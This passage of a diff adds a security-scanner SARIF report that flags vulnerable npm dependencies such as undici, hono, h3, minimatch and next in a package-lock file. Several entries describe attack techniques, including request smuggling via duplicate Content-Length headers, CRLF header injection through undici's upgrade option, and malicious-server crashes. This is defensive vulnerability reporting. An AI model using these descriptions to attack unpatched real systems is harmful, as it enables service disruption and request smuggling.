+                "markdown": "**Vulnerability CVE-2026-2229**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|undici|6.24.0, 7.24.0|[CVE-2026-2229](https://avd.aquasec.com/nvd/cve-2026-2229)|\n\nImpactThe undici WebSocket client is vulnerable to a denial-of-service attack due to improper validation of the server_max_window_bits parameter in the permessage-deflate extension. When a WebSocket client connects to a server, it automatically advertises support for permessage-deflate compression. A malicious server can respond with an out-of-range server_max_window_bits value (outside zlib's valid range of 8-15). When the server subsequently sends a compressed frame, the client attempts to create a zlib InflateRaw instance with the invalid windowBits value, causing a synchronous RangeError exception that is not caught, resulting in immediate process termination.\n\nThe vulnerability exists because:\n\n  *  The isValidClientWindowBits() function only validates that the value contains ASCII digits, not that it falls within the valid range 8-15\n  *  The createInflateRaw() call is not wrapped in a try-catch block\n  *  The resulting exception propagates up through the call stack and crashes the Node.js process"
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-1525",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "undici: Undici: HTTP Request Smuggling and Denial of Service due to duplicate Content-Length headers"
+              },
+              "fullDescription": {
+                "text": "Undici allows duplicate HTTP Content-Length headers when they are provided in an array with case-variant names (e.g., Content-Length and content-length). This produces malformed HTTP/1.1 requests with multiple conflicting Content-Length values on the wire.\n\nWho is impacted:\n\n  *  Applications using undici.request(), undici.Client, or similar low-level APIs with headers passed as flat arrays\n  *  Applications that accept user-controlled header names without case-normalization\n\n\nPotential consequences:\n\n  *  Denial of Service: Strict HTTP parsers (proxies, servers) will reject requests with duplicate Content-Length headers (400 Bad Request)\n  *  HTTP Request Smuggling: In deployments where an intermediary and backend interpret duplicate headers inconsistently (e.g., one uses the first value, the other uses the last), this can enable request smuggling attacks leading to ACL bypass, cache poisoning, or credential hijacking"
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-1525",
+              "help": {
+                "text": "Vulnerability CVE-2026-1525\nSeverity: MEDIUM\nPackage: undici\nFixed Version: 6.24.0, 7.24.0\nLink: [CVE-2026-1525](https://avd.aquasec.com/nvd/cve-2026-1525)\nUndici allows duplicate HTTP Content-Length headers when they are provided in an array with case-variant names (e.g., Content-Length and content-length). This produces malformed HTTP/1.1 requests with multiple conflicting Content-Length values on the wire.\n\nWho is impacted:\n\n  *  Applications using undici.request(), undici.Client, or similar low-level APIs with headers passed as flat arrays\n  *  Applications that accept user-controlled header names without case-normalization\n\n\nPotential consequences:\n\n  *  Denial of Service: Strict HTTP parsers (proxies, servers) will reject requests with duplicate Content-Length headers (400 Bad Request)\n  *  HTTP Request Smuggling: In deployments where an intermediary and backend interpret duplicate headers inconsistently (e.g., one uses the first value, the other uses the last), this can enable request smuggling attacks leading to ACL bypass, cache poisoning, or credential hijacking",
+                "markdown": "**Vulnerability CVE-2026-1525**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|undici|6.24.0, 7.24.0|[CVE-2026-1525](https://avd.aquasec.com/nvd/cve-2026-1525)|\n\nUndici allows duplicate HTTP Content-Length headers when they are provided in an array with case-variant names (e.g., Content-Length and content-length). This produces malformed HTTP/1.1 requests with multiple conflicting Content-Length values on the wire.\n\nWho is impacted:\n\n  *  Applications using undici.request(), undici.Client, or similar low-level APIs with headers passed as flat arrays\n  *  Applications that accept user-controlled header names without case-normalization\n\n\nPotential consequences:\n\n  *  Denial of Service: Strict HTTP parsers (proxies, servers) will reject requests with duplicate Content-Length headers (400 Bad Request)\n  *  HTTP Request Smuggling: In deployments where an intermediary and backend interpret duplicate headers inconsistently (e.g., one uses the first value, the other uses the last), this can enable request smuggling attacks leading to ACL bypass, cache poisoning, or credential hijacking"
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "6.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-1527",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "undici: Undici: HTTP header injection and request smuggling vulnerability"
+              },
+              "fullDescription": {
+                "text": "ImpactWhen an application passes user-controlled input to the upgrade option of client.request(), an attacker can inject CRLF sequences (\\r\\n) to:\n\n  *  Inject arbitrary HTTP headers\n  *  Terminate the HTTP request prematurely and smuggle raw data to non-HTTP services (Redis, Memcached, Elasticsearch)\nThe vulnerability exists because undici writes the upgrade value directly to the socket without validating for invalid header characters:\n\n// lib/dispatcher/client-h1.js:1121\nif (upgrade) {\n  header += `connection: upgrade\\r\\nupgrade: ${upgrade}\\r\\n`\n}"
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-1527",
+              "help": {
+                "text": "Vulnerability CVE-2026-1527\nSeverity: MEDIUM\nPackage: undici\nFixed Version: 6.24.0, 7.24.0\nLink: [CVE-2026-1527](https://avd.aquasec.com/nvd/cve-2026-1527)\nImpactWhen an application passes user-controlled input to the upgrade option of client.request(), an attacker can inject CRLF sequences (\\r\\n) to:\n\n  *  Inject arbitrary HTTP headers\n  *  Terminate the HTTP request prematurely and smuggle raw data to non-HTTP services (Redis, Memcached, Elasticsearch)\nThe vulnerability exists because undici writes the upgrade value directly to the socket without validating for invalid header characters:\n\n// lib/dispatcher/client-h1.js:1121\nif (upgrade) {\n  header += `connection: upgrade\\r\\nupgrade: ${upgrade}\\r\\n`\n}",
+                "markdown": "**Vulnerability CVE-2026-1527**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|undici|6.24.0, 7.24.0|[CVE-2026-1527](https://avd.aquasec.com/nvd/cve-2026-1527)|\n\nImpactWhen an application passes user-controlled input to the upgrade option of client.request(), an attacker can inject CRLF sequences (\\r\\n) to:\n\n  *  Inject arbitrary HTTP headers\n  *  Terminate the HTTP request prematurely and smuggle raw data to non-HTTP services (Redis, Memcached, Elasticsearch)\nThe vulnerability exists because undici writes the upgrade value directly to the socket without validating for invalid header characters:\n\n// lib/dispatcher/client-h1.js:1121\nif (upgrade) {\n  header += `connection: upgrade\\r\\nupgrade: ${upgrade}\\r\\n`\n}"
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "4.6",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-22036",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "undici: Undici: Denial of Service via excessive decompression steps"
+              },
+              "fullDescription": {
+                "text": "Undici is an HTTP/1.1 client for Node.js. Prior to 7.18.0 and 6.23.0, the number of links in the decompression chain is unbounded and the default maxHeaderSize allows a malicious server to insert thousands compression steps leading to high CPU usage and excessive memory allocation. This vulnerability is fixed in 7.18.0 and 6.23.0."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-22036",
+              "help": {
+                "text": "Vulnerability CVE-2026-22036\nSeverity: MEDIUM\nPackage: undici\nFixed Version: 7.18.2, 6.23.0\nLink: [CVE-2026-22036](https://avd.aquasec.com/nvd/cve-2026-22036)\nUndici is an HTTP/1.1 client for Node.js. Prior to 7.18.0 and 6.23.0, the number of links in the decompression chain is unbounded and the default maxHeaderSize allows a malicious server to insert thousands compression steps leading to high CPU usage and excessive memory allocation. This vulnerability is fixed in 7.18.0 and 6.23.0.",
+                "markdown": "**Vulnerability CVE-2026-22036**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|undici|7.18.2, 6.23.0|[CVE-2026-22036](https://avd.aquasec.com/nvd/cve-2026-22036)|\n\nUndici is an HTTP/1.1 client for Node.js. Prior to 7.18.0 and 6.23.0, the number of links in the decompression chain is unbounded and the default maxHeaderSize allows a malicious server to insert thousands compression steps leading to high CPU usage and excessive memory allocation. This vulnerability is fixed in 7.18.0 and 6.23.0."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "5.9",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            }
+          ],
+          "version": "0.58.1"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CVE-2026-25639",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 1.13.2\nVulnerability CVE-2026-25639\nSeverity: HIGH\nFixed Version: 1.13.5, 0.30.3\nLink: [CVE-2026-25639](https://avd.aquasec.com/nvd/cve-2026-25639)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 15604,
+                  "startColumn": 1,
+                  "endLine": 15614,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@1.13.2"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-2739",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "Package: bn.js\nInstalled Version: 4.12.2\nVulnerability CVE-2026-2739\nSeverity: MEDIUM\nFixed Version: 4.12.3, 5.2.3\nLink: [CVE-2026-2739](https://avd.aquasec.com/nvd/cve-2026-2739)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 17682,
+                  "startColumn": 1,
+                  "endLine": 17687,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: bn.js@4.12.2"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-2739",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "Package: bn.js\nInstalled Version: 5.2.2\nVulnerability CVE-2026-2739\nSeverity: MEDIUM\nFixed Version: 4.12.3, 5.2.3\nLink: [CVE-2026-2739](https://avd.aquasec.com/nvd/cve-2026-2739)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 15862,
+                  "startColumn": 1,
+                  "endLine": 15867,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: bn.js@5.2.2"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-47764",
+          "ruleIndex": 2,
+          "level": "note",
+          "message": {
+            "text": "Package: cookie\nInstalled Version: 0.4.2\nVulnerability CVE-2024-47764\nSeverity: LOW\nFixed Version: 0.7.0\nLink: [CVE-2024-47764](https://avd.aquasec.com/nvd/cve-2024-47764)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 16617,
+                  "startColumn": 1,
+                  "endLine": 16626,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: cookie@0.4.2"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-24001",
+          "ruleIndex": 3,
+          "level": "note",
+          "message": {
+            "text": "Package: diff\nInstalled Version: 4.0.2\nVulnerability CVE-2026-24001\nSeverity: LOW\nFixed Version: 8.0.3, 5.2.2, 4.0.4, 3.5.1\nLink: [CVE-2026-24001](https://avd.aquasec.com/nvd/cve-2026-24001)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 27415,
+                  "startColumn": 1,
+                  "endLine": 27424,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: diff@4.0.2"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-24001",
+          "ruleIndex": 3,
+          "level": "note",
+          "message": {
+            "text": "Package: diff\nInstalled Version: 5.2.0\nVulnerability CVE-2026-24001\nSeverity: LOW\nFixed Version: 8.0.3, 5.2.2, 4.0.4, 3.5.1\nLink: [CVE-2026-24001](https://avd.aquasec.com/nvd/cve-2026-24001)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 17459,
+                  "startColumn": 1,
+                  "endLine": 17468,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: diff@5.2.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-23527",
+          "ruleIndex": 4,
+          "level": "error",
+          "message": {
+            "text": "Package: h3\nInstalled Version: 1.15.4\nVulnerability CVE-2026-23527\nSeverity: HIGH\nFixed Version: 1.15.5\nLink: [CVE-2026-23527](https://avd.aquasec.com/nvd/cve-2026-23527)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 19809,
+                  "startColumn": 1,
+                  "endLine": 19825,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: h3@1.15.4"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-33128",
+          "ruleIndex": 5,
+          "level": "error",
+          "message": {
+            "text": "Package: h3\nInstalled Version: 1.15.4\nVulnerability CVE-2026-33128\nSeverity: HIGH\nFixed Version: 2.0.1-rc.15, 1.15.6\nLink: [CVE-2026-33128](https://avd.aquasec.com/nvd/cve-2026-33128)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 19809,
+                  "startColumn": 1,
+                  "endLine": 19825,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: h3@1.15.4"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-wr4h-v87w-p3r7",
+          "ruleIndex": 6,
+          "level": "warning",
+          "message": {
+            "text": "Package: h3\nInstalled Version: 1.15.4\nVulnerability GHSA-wr4h-v87w-p3r7\nSeverity: MEDIUM\nFixed Version: 2.0.1-rc.15, 1.15.6\nLink: [GHSA-wr4h-v87w-p3r7](https://github.com/advisories/GHSA-wr4h-v87w-p3r7)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 19809,
+                  "startColumn": 1,
+                  "endLine": 19825,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: h3@1.15.4"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-22817",
+          "ruleIndex": 7,
+          "level": "error",
+          "message": {
+            "text": "Package: hono\nInstalled Version: 4.10.8\nVulnerability CVE-2026-22817\nSeverity: HIGH\nFixed Version: 4.11.4\nLink: [CVE-2026-22817](https://avd.aquasec.com/nvd/cve-2026-22817)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 20279,
+                  "startColumn": 1,
+                  "endLine": 20287,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: hono@4.10.8"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-22818",
+          "ruleIndex": 8,
+          "level": "error",
+          "message": {
+            "text": "Package: hono\nInstalled Version: 4.10.8\nVulnerability CVE-2026-22818\nSeverity: HIGH\nFixed Version: 4.11.4\nLink: [CVE-2026-22818](https://avd.aquasec.com/nvd/cve-2026-22818)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 20279,
+                  "startColumn": 1,
+                  "endLine": 20287,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: hono@4.10.8"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-29045",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "Package: hono\nInstalled Version: 4.10.8\nVulnerability CVE-2026-29045\nSeverity: HIGH\nFixed Version: 4.12.4\nLink: [CVE-2026-29045](https://avd.aquasec.com/nvd/cve-2026-29045)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 20279,
+                  "startColumn": 1,
+                  "endLine": 20287,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: hono@4.10.8"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-24398",
+          "ruleIndex": 10,
+          "level": "warning",
+          "message": {
+            "text": "Package: hono\nInstalled Version: 4.10.8\nVulnerability CVE-2026-24398\nSeverity: MEDIUM\nFixed Version: 4.11.7\nLink: [CVE-2026-24398](https://avd.aquasec.com/nvd/cve-2026-24398)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 20279,
+                  "startColumn": 1,
+                  "endLine": 20287,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: hono@4.10.8"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-24472",
+          "ruleIndex": 11,
+          "level": "warning",
+          "message": {
+            "text": "Package: hono\nInstalled Version: 4.10.8\nVulnerability CVE-2026-24472\nSeverity: MEDIUM\nFixed Version: 4.11.7\nLink: [CVE-2026-24472](https://avd.aquasec.com/nvd/cve-2026-24472)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 20279,
+                  "startColumn": 1,
+                  "endLine": 20287,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: hono@4.10.8"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-24473",
+          "ruleIndex": 12,
+          "level": "warning",
+          "message": {
+            "text": "Package: hono\nInstalled Version: 4.10.8\nVulnerability CVE-2026-24473\nSeverity: MEDIUM\nFixed Version: 4.11.7\nLink: [CVE-2026-24473](https://avd.aquasec.com/nvd/cve-2026-24473)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 20279,
+                  "startColumn": 1,
+                  "endLine": 20287,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: hono@4.10.8"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-24771",
+          "ruleIndex": 13,
+          "level": "warning",
+          "message": {
+            "text": "Package: hono\nInstalled Version: 4.10.8\nVulnerability CVE-2026-24771\nSeverity: MEDIUM\nFixed Version: 4.11.7\nLink: [CVE-2026-24771](https://avd.aquasec.com/nvd/cve-2026-24771)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 20279,
+                  "startColumn": 1,
+                  "endLine": 20287,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: hono@4.10.8"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-29085",
+          "ruleIndex": 14,
+          "level": "warning",
+          "message": {
+            "text": "Package: hono\nInstalled Version: 4.10.8\nVulnerability CVE-2026-29085\nSeverity: MEDIUM\nFixed Version: 4.12.4\nLink: [CVE-2026-29085](https://avd.aquasec.com/nvd/cve-2026-29085)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 20279,
+                  "startColumn": 1,
+                  "endLine": 20287,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: hono@4.10.8"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-29086",
+          "ruleIndex": 15,
+          "level": "warning",
+          "message": {
+            "text": "Package: hono\nInstalled Version: 4.10.8\nVulnerability CVE-2026-29086\nSeverity: MEDIUM\nFixed Version: 4.12.4\nLink: [CVE-2026-29086](https://avd.aquasec.com/nvd/cve-2026-29086)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 20279,
+                  "startColumn": 1,
+                  "endLine": 20287,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: hono@4.10.8"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-v8w9-8mx6-g223",
+          "ruleIndex": 16,
+          "level": "warning",
+          "message": {
+            "text": "Package: hono\nInstalled Version: 4.10.8\nVulnerability GHSA-v8w9-8mx6-g223\nSeverity: MEDIUM\nFixed Version: 4.12.7\nLink: [GHSA-v8w9-8mx6-g223](https://github.com/advisories/GHSA-v8w9-8mx6-g223)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 20279,
+                  "startColumn": 1,
+                  "endLine": 20287,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: hono@4.10.8"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-gq3j-xvxp-8hrf",
+          "ruleIndex": 17,
+          "level": "note",
+          "message": {
+            "text": "Package: hono\nInstalled Version: 4.10.8\nVulnerability GHSA-gq3j-xvxp-8hrf\nSeverity: LOW\nFixed Version: 4.11.10\nLink: [GHSA-gq3j-xvxp-8hrf](https://github.com/advisories/GHSA-gq3j-xvxp-8hrf)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 20279,
+                  "startColumn": 1,
+                  "endLine": 20287,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: hono@4.10.8"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-29063",
+          "ruleIndex": 18,
+          "level": "error",
+          "message": {
+            "text": "Package: immutable\nInstalled Version: 4.3.7\nVulnerability CVE-2026-29063\nSeverity: HIGH\nFixed Version: 4.3.8, 5.1.5, 3.8.3\nLink: [CVE-2026-29063](https://avd.aquasec.com/nvd/cve-2026-29063)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 20059,
+                  "startColumn": 1,
+                  "endLine": 20065,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: immutable@4.3.7"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-13465",
+          "ruleIndex": 19,
+          "level": "warning",
+          "message": {
+            "text": "Package: lodash\nInstalled Version: 4.17.21\nVulnerability CVE-2025-13465\nSeverity: MEDIUM\nFixed Version: 4.17.23\nLink: [CVE-2025-13465](https://avd.aquasec.com/nvd/cve-2025-13465)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 22168,
+                  "startColumn": 1,
+                  "endLine": 22173,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: lodash@4.17.21"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-26996",
+          "ruleIndex": 20,
+          "level": "error",
+          "message": {
+            "text": "Package: minimatch\nInstalled Version: 5.1.6\nVulnerability CVE-2026-26996\nSeverity: HIGH\nFixed Version: 10.2.1, 9.0.6, 8.0.5, 7.4.7, 6.2.1, 5.1.7, 4.2.4, 3.1.3\nLink: [CVE-2026-26996](https://avd.aquasec.com/nvd/cve-2026-26996)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 19579,
+                  "startColumn": 1,
+                  "endLine": 19591,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: minimatch@5.1.6"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 23320,
+                  "startColumn": 1,
+                  "endLine": 23332,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: minimatch@5.1.6"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-27903",
+          "ruleIndex": 21,
+          "level": "error",
+          "message": {
+            "text": "Package: minimatch\nInstalled Version: 5.1.6\nVulnerability CVE-2026-27903\nSeverity: HIGH\nFixed Version: 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, 3.1.3\nLink: [CVE-2026-27903](https://avd.aquasec.com/nvd/cve-2026-27903)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 19579,
+                  "startColumn": 1,
+                  "endLine": 19591,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: minimatch@5.1.6"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 23320,
+                  "startColumn": 1,
+                  "endLine": 23332,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: minimatch@5.1.6"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-27904",
+          "ruleIndex": 22,
+          "level": "error",
+          "message": {
+            "text": "Package: minimatch\nInstalled Version: 5.1.6\nVulnerability CVE-2026-27904\nSeverity: HIGH\nFixed Version: 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, 3.1.4\nLink: [CVE-2026-27904](https://avd.aquasec.com/nvd/cve-2026-27904)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 19579,
+                  "startColumn": 1,
+                  "endLine": 19591,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: minimatch@5.1.6"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 23320,
+                  "startColumn": 1,
+                  "endLine": 23332,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: minimatch@5.1.6"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-h25m-26qc-wcjf",
+          "ruleIndex": 23,
+          "level": "error",
+          "message": {
+            "text": "Package: next\nInstalled Version: 15.5.9\nVulnerability GHSA-h25m-26qc-wcjf\nSeverity: HIGH\nFixed Version: 15.0.8, 15.1.12, 15.2.9, 15.3.9, 15.4.11, 15.5.10, 15.6.0-canary.61, 16.0.11, 16.1.5\nLink: [GHSA-h25m-26qc-wcjf](https://github.com/advisories/GHSA-h25m-26qc-wcjf)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 23480,
+                  "startColumn": 1,
+                  "endLine": 23531,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: next@15.5.9"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-59471",
+          "ruleIndex": 24,
+          "level": "warning",
+          "message": {
+            "text": "Package: next\nInstalled Version: 15.5.9\nVulnerability CVE-2025-59471\nSeverity: MEDIUM\nFixed Version: 15.5.10, 16.1.5\nLink: [CVE-2025-59471](https://avd.aquasec.com/nvd/cve-2025-59471)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 23480,
+                  "startColumn": 1,
+                  "endLine": 23531,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: next@15.5.9"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-27980",
+          "ruleIndex": 25,
+          "level": "warning",
+          "message": {
